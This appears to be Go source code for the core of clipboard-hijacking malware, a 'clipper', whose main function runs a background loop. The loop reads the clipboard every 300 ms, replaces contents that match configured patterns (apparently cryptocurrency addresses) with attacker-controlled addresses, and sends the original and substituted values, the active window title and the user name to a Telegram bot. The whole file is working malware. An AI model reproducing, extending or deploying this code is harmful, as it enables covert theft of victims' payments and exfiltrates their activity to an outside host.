package clipper

import (
	"fmt"
	"regexp"
	"time"

	"github.com/atotto/clipboard"

	"clipper/src/telegram"
	"clipper/src/utils"
)

type Matcher struct {
	Regex *regexp.Regexp
	Addr  string
}

// main clipper func
func StartClipper(chat_id string, bot_token string, matchers []Matcher, user string) {
	go func() {
		var lastClipboardContent string

		for {
			time.Sleep(300 * time.Millisecond) // (1000 = 1s)

			currentContent, err := clipboard.ReadAll()
			if err != nil {
				continue
			}

			if currentContent == lastClipboardContent {
				continue
			}

			matched := false
			for _, matcher := range matchers {
				if matcher.Regex.MatchString(currentContent) {
					if matcher.Addr == "0" {
						lastClipboardContent = currentContent
						continue
					}
					
					isAlreadyReplaced := false
					for _, m := range matchers {
						if m.Addr == currentContent {
							isAlreadyReplaced = true
							break
						}
					}

					if isAlreadyReplaced {
						lastClipboardContent = currentContent
						continue
					}

					originalAddr := currentContent

					err = clipboard.WriteAll(matcher.Addr)
					if err != nil {
						continue
					}

					lastClipboardContent = matcher.Addr
					matched = true

					telegram.SendLog(
						fmt.Sprintf(
							"%s | %s\n\n<code>%s</code> → <code>%s</code>",
							utils.GetActiveWindow(),
							user,
							originalAddr,
							matcher.Addr,
						),
						chat_id,
						bot_token,
					)

					break
				}
			}

			if !matched {
				lastClipboardContent = currentContent
			}
		}
	}()
}